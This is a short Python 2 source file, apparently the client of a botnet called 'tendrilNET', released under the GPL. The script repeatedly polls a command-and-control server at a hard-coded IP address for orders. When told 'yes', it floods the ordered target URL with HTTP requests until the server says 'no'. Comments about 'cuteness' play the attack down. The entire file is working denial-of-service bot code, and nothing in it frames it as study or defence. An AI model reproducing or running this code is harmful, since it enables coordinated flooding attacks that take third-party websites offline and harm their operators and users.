#!/usr/bin/python

########################################################################
# Copyright 2015 Daniel Haake
#
# This file is part of tendrilNET                  
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################


import urllib2


candc = "192.168.1.56"

while(True):
    # get tendril orders
    orders = urllib2.urlopen("http://" + candc + "/orders").read().split("\n")

    # perform action (for extra cuteness)
    doit = orders[0]
    target = orders[1]

    if doit == "yes":
        # let the cuteness begin
        # command refresh intervall = 10
        count = 0
        while(True):
            if count%5 == 0:
                orders = urllib2.urlopen("http://" + candc + "/orders").read().split("\n")
                if orders[0] == "no":
                    #print "stop attack"
                    break
                else:
                    target = orders[1]
                count = 0
            #print target
            urllib2.urlopen(target)
            count += 1
